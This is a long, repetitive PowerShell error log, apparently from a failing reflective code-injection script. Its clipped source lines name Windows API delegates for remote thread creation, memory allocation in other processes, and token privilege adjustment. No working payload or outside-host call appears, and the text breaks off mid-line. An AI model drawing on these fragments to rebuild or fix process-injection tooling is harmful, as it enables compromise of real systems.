$CreateRemoteThread = [System.Runtime.InteropServices.Marshal ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:574 char:9\n+         $GetExitCodeThread = [System.Runtime.InteropServices.Marshal] ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:579 char:9\n+         $OpenThreadToken = [System.Runtime.InteropServices.Marshal]:: ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:584 char:9\n+         $GetCurrentThread = [System.Runtime.InteropServices.Marshal]: ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:589 char:9\n+         $AdjustTokenPrivileges = [System.Runtime.InteropServices.Mars ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:594 char:9\n+         $LookupPrivilegeValue = [System.Runtime.InteropServices.Marsh ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:599 char:9\n+         $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]:: ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:612 char:9\n+         $IsWow64Process = [System.Runtime.InteropServices.Marshal]::G ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:617 char:9\n+         $CreateThread = [System.Runtime.InteropServices.Marshal]::Get ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:622 char:3\n+         $LocalFree = [System.Runtime.InteropServices.Marshal]::GetDel ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:489 char:3\n+         $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::Get ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:494 char:3\n+         $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::G ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:499 char:3\n+         $memcpy = [System.Runtime.InteropServices.Marshal]::GetDelega ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:504 char:3\n+         $memset = [System.Runtime.InteropServices.Marshal]::GetDelega ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:509 char:3\n+         $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetD ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:514 char:3\n+         $GetProcAddress = [System.Runtime.InteropServices.Marshal]::G ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:519 char:3\n+         $GetProcAddressOrdinal = [System.Runtime.InteropServices.Mars ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:524 char:3\n+         $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetD ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:529 char:3\n+         $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::Ge ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:534 char:3\n+         $VirtualProtect = [System.Runtime.InteropServices.Marshal]::G ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:539 char:3\n+         $GetModuleHandle = [System.Runtime.InteropServices.Marshal]:: ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:544 char:3\n+         $FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetD ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:549 char:6\n+         $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetD ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:554 char:6\n+         $WaitForSingleObject = [System.Runtime.InteropServices.Marsha ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for 